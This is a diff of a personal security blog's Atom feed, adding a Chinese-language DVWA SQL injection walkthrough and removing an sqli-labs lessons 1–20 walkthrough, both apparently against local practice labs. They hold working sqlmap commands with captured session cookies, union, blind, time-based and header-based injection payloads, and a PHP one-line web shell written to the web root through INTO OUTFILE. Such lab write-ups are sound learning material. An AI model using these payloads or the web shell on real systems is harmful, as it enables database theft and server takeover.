@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T17:11:10.362Z</updated>
+    <updated>2022-04-14T17:37:15.403Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -10,6 +10,117 @@
     <logo>https://z0ekball.github.io/images/avatar.png</logo>
     <icon>https://z0ekball.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, z0ekball</rights>
+    <entry>
+        <title type="html"><![CDATA[DVWA练习(SQL Injection)]]></title>
+        <id>https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/</id>
+        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/">
+        </link>
+        <updated>2021-10-26T17:30:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="sql-injection-low">SQL Injection-Low</h2>
+<p>抓包<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415011925419.png" alt="image-20220415011925419" loading="lazy"></p>
+<p>直接用<code>sqlmap</code></p>
+<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --dbs
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415011952778.png" alt="image-20220415011952778" loading="lazy"></figure>
+<p>说明需要上传cookie，加上抓包的cookie即可</p>
+<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; --dbs
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415012023569.png" alt="image-20220415012023569" loading="lazy"></figure>
+<p>爆表：</p>
+<pre><code class="language-sql">
+sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa –tables
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415012047969.png" alt="image-20220415012047969" loading="lazy"></figure>
+<p>爆列：</p>
+<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users –columns
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415012103755.png" alt="image-20220415012103755" loading="lazy"></figure>
+<p>爆字段：</p>
+<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users -C user,password –dump
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415012118950.png" alt="image-20220415012118950" loading="lazy"></figure>
+<h2 id="sql-injection-medium">SQL Injection-Medium</h2>
+<p>抓包，post方式提交数据</p>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415012132436.png" alt="image-20220415012132436" loading="lazy"></figure>
+<p>把包保存到本地，用sqlmap注入</p>
+<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt –dbs查库
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415012146073.png" alt="image-20220415012146073" loading="lazy"></figure>
+<p>和low一样的操作查后续信息</p>
+<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa –tables查表
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415012152768.png" alt="image-20220415012152768" loading="lazy"></figure>
+<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users –columns查列
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415012208701.png" alt="image-20220415012208701" loading="lazy"></figure>
+<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users -C user,user_id --dump
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415012222670.png" alt="image-20220415012222670" loading="lazy"></figure>
+<h2 id="sql-injection-high">SQL Injection-High</h2>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415012231790.png" alt="image-20220415012231790" loading="lazy"></figure>
+<p>抓包，尝试手注</p>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415012324805.png" alt="image-20220415012324805" loading="lazy"></figure>
+<p>回显两个数据，说明有两个注入点</p>
+<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415012355929.png" alt="image-20220415012355929" loading="lazy"></figure>
+<pre><code class="language-sql">查数据库：1' union select 1,database()#
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415012400865.png" alt="image-20220415012400865" loading="lazy"></figure>
+<pre><code class="language-sql">查表：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，报错
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415012441759.png" alt="image-20220415012441759" loading="lazy"></figure>
+<p>没能解决这个问题，换一个思路，用sqlmap</p>
+<p>抓包保存，由于题目在弹出的窗口上写入注入语句，在原来的网页回显，所以要设置重定向的网络</p>
+<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post2.txt --second-url &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/&quot; –dbs
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415012454901.png" alt="image-20220415012454901" loading="lazy"></figure>
+<p>后续步骤和前面的两题相同</p>
+<h2 id="sql-injection-blind-low">SQL Injection (Blind)-Low</h2>
+<p>无过滤get盲注</p>
+<pre><code class="language-sql">1' and (length(database())&gt;3 and length(database())&lt;5)#
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415012520420.png" alt="image-20220415012520420" loading="lazy"></figure>
+<p>说明数据库长度为4</p>
+<pre><code class="language-sql">1’ and ascii(substr(database(),1,1))=100#
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415012525108.png" alt="image-20220415012525108" loading="lazy"></figure>
+<p>说明数据库第一个字母为d</p>
+<p>结合脚本爆破数据库名：</p>
+<p>抓包获取url和cookie，加入请求头</p>
+<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415012554111.png" alt="image-20220415012554111" loading="lazy"></figure>
+<p>修改注入字段得到查表脚本：</p>
+<pre><code class="language-sql">inner = &quot;?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u %%23&amp;Submit=Submit#&quot;
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415012622039.png" alt="image-20220415012622039" loading="lazy"></figure>
+<h2 id="sql-injection-blind-medium">SQL Injection (Blind)-Medium</h2>
+<p>有过滤post盲注</p>
+<p>结合burpsuite和脚本进行注入：id=1 and 1=1#&amp;Submit=Submit</p>
+<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415012639939.png" alt="image-20220415012639939" loading="lazy"></figure>
+<p>burpsuite爆破库长度</p>
+<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415012657971.png" alt="image-20220415012657971" loading="lazy"></figure>
+<p>简单数字爆破</p>
+<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415012703391.png" alt="image-20220415012703391" loading="lazy"></figure>
+<p>返回长度判断长度为4</p>
+<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415012707835.png" alt="image-20220415012707835" loading="lazy"></figure>
+<p>脚本爆破库名</p>
+<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415012745679.png" alt="image-20220415012745679" loading="lazy"></figure>
+<p>类似low，爆破表名：</p>
+<pre><code class="language-sql">inner = &quot;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u #&quot;
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415012802867.png" alt="image-20220415012802867" loading="lazy"></figure>
+<h2 id="sql-injection-blind-high">SQL Injection (Blind)-High</h2>
+<p>把提交数据和回显数据分开输入与返回，有效加大了脚本注入的难度，采用手注</p>
+<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415012825557.png" alt="image-20220415012825557" loading="lazy"></figure>
+<pre><code class="language-sql">1' and length(database())&gt;4#
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415012833176.png" alt="image-20220415012833176" loading="lazy"></figure>
+<pre><code class="language-sql">1' and length(database())=4#
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415012847028.png" alt="image-20220415012847028" loading="lazy"></figure>
+<p>库名长为4</p>
+<p>后续注入和前面相同</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[秋季赛WP]]></title>
         <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
@@ -1064,195 +1175,6 @@ print(name)
 <figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
 <h1 id="less-10">less-10</h1>
 <p>id=1&quot;--+,其他和9一样</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sqli-labs学习1~20]]></title>
-        <id>https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
-        <link href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
-        </link>
-        <updated>2021-06-05T12:22:39.000Z</updated>
-        <content type="html"><![CDATA[<h5 id="注为方便学习加入两行代码">注：为方便学习,加入两行代码</h5>
-<pre><code class="language-sql">echo $sql;
-echo &quot;&lt;br&gt;&quot;;
-</code></pre>
-<h1 id="贯穿始终的步骤">贯穿始终的步骤：</h1>
-<pre><code class="language-sql">mysql查询语句
-查库：select schema_name from information_schema.schemata;
-查表：select table_name from information_schema.tables where table_schema='security';
-查列：select column_name from information_schema.columns where table_name='users';
-查字段：select username,password from security.users;
-</code></pre>
-<h1 id="less-1">less-1</h1>
-<p>注入漏洞：id=1'--+</p>
-<h3 id="知识点补充">知识点补充：</h3>
-<pre><code class="language-sql">* order by //判断多少个注入点
-* union select  1,2,3  //查看那些数据可以回显(id=-1)
-* group_concat() //批量查询
-* concat_ws('~',a,b) //查询a~b
-</code></pre>
-<h3 id="查看当前数据库">查看当前数据库</h3>
-<pre><code class="language-sql">id=-1' union select 1,2,database() --+
-id=-1'  union select 1,2,concat_ws('~',user(),version(),database()) --+ 
-//查询数据库版本,路径,当前用户,当前数据库
-</code></pre>
-<h3 id="查看数据库所有数据库">查看数据库/所有数据库</h3>
-<pre><code class="language-sql">id=-1' union select 1,2,schema_name from information_schema.schemata limit 4,1--+  //limit 决定查看序数
-id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
-</code></pre>
-<h3 id="查看表所有表">查看表/所有表</h3>
-<pre><code class="language-sql">id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x() limit 1,1--+
-//十六进制绕过
-id=-1' union select 1,2,group_concat(table_name) from information_schema. tables where table_schema=0x()--+
-</code></pre>
-<h3 id="查看列信息所有列信息">查看列信息/所有列信息</h3>
-<pre><code class="language-sql">id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x() --+
-
-id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
-<h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
-<pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+
-
-id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
-<h1 id="less-2">less-2</h1>
-<p>注入漏洞：id=1--+,不需要'</p>
-<h1 id="less-3">less-3</h1>
-<p>注入漏洞：id=1')--+</p>
-<h1 id="less-4">less-4</h1>
-<p>注入漏洞：id=1”)--+</p>
-<h1 id="less-5布尔型盲注">less-5（布尔型盲注）</h1>
-<p>注入漏洞：1'--+,布尔型盲注</p>
-<h3 id="知识点补充-2">知识点补充</h3>
-<pre><code class="language-sql">1. left(a,b) 从左侧截取a的前b位,正确返回1,错则返回0 ——burpsuit爆破
-2. regexp 正则表达式
-/转意
-^匹配开始部分
-$匹配结束部分
-.匹配任何字符
-[:character_class:]术语类的所有字符匹配的字符类
-[[:&lt;:]],[[:&gt;:]]word 边界,
-3. like 
-'n%'以N开始的
-'%g'以g结尾
-'%s%'包含s
-4.substr(a,b,c) 从b开始,截取a字符c位长度
-ascii(substr((select database()),1,1)2分法获得字符 
-//当没有在当前数据库下没有回显,一般不适用
-</code></pre>
-<h3 id="猜测字符方法">猜测字符方法</h3>
-<pre><code>burpsuite爆破
-手动二分法
-脚本
-</code></pre>
-<h3 id="示例">示例</h3>
-<pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
-</code></pre>
-<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
-<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
-<h1 id="less-6">less-6</h1>
-<p>注入漏洞：id=1”--+,布尔型盲注</p>
-<h1 id="less-7一句话木马">less-7（一句话木马）</h1>
-<p>注入漏洞：id=1'))--+,布尔型盲注</p>
-<h3 id="知识点补充-3">知识点补充：</h3>
-<pre><code class="language-sql">1.一句话木马： &lt;?php @eval($_POST['attack']);?&gt;
-【基本原理】利用文件上传漏洞,往目标网站中上传一句话木马,然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误,也不报错。eval()函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。
-【条件】
-(1)木马上传成功,未被杀;
-(2)知道木马的路径在哪;
-(3)上传的木马能正常运行。
-2.load_file('文件路径')：读取本地文件 (避免特殊字符使用双斜杠\\)
-3.into outfile：写文件
-</code></pre>
-<h3 id="示例-2">示例</h3>
-<pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
-</code></pre>
-<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
-<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
-<h1 id="less-8">less-8</h1>
-<p>注入漏洞：id=1'--+,布尔盲注</p>
-<h1 id="less-9时间盲注">less-9（时间盲注）</h1>
-<p>注入漏洞：id=1' --+,时间盲注</p>
-<h3 id="实例">实例</h3>
-<pre><code class="language-sql">id=1' and sleep(5)--+ //延迟5秒表示注入成功
-</code></pre>
-<h1 id="less-10">less-10</h1>
-<p>注入漏洞：id=1”--+,时间盲注</p>
-<h1 id="less-11">less-11</h1>
-<p>注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
-<h3 id="实例-和get相同">实例 (和get相同)</h3>
-<pre><code class="language-sql">//查多少个注入点
-uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit
-
-//查到数据库——security
-uname=n' union select 1,schema_name from information_schema.schemata limit 2,1 #&amp;passwd=admin&amp;submit=Submit 
-
-//查看表——users
-uname=n' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'  #&amp;passwd=admin&amp;submit=Submit
-
-//查看列——username
-uname=n' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'  #&amp;passwd=admin&amp;submit=Submit
-
-//查所有username
-uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd=admin&amp;submit=Submit
-
-//查询用户~密码
-uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
-<h1 id="less-12">less-12</h1>
-<p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
-<h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
-<p>注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit<br>
-布尔型盲注</p>
-<h3 id="实例-2">实例</h3>
-<pre><code class="language-sql">burp suite爆破：
-uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
-<h1 id="less-14">less-14</h1>
-<p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
-布尔型盲注</p>
-<h1 id="less-15">less-15</h1>
-<p>注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit<br>
-注入点在passwd,其他一样<br>
-布尔型盲注</p>
-<h1 id="less-16">less-16</h1>
-<p>注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit<br>
-布尔型盲注</p>
-<h1 id="less-17更新漏洞">less-17（更新漏洞）</h1>
-<p>注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit<br>
-更新密码存在注入漏洞</p>
-<h3 id="知识点补充-4">知识点补充</h3>
-<pre><code>updatexml(XML_document,XPath_string,new_value)
-第一个参数：string格式,xml文件对象名称
-第二个参数：xpath格式字符串
-第三个参数：string格式,替换查找符合条件的数据
-作用：改变文档中符合节点条件的节点值
-</code></pre>
-<h3 id="实例-3">实例</h3>
-<pre><code class="language-sql">//返回当前数据库
-uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
-<h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
-<p>注入漏洞：<br>
-User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
-//   '闭合<br>
-User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
-//另一种闭合</p>
-<h3 id="实例-4">实例</h3>
-<pre><code>//查库
-User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
-<h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
-<p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
-注入点在referer,其他一样</p>
-<h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
-<p>注入漏洞：cookie中value值'    #注入</p>
 ]]></content>
     </entry>
 </feed>
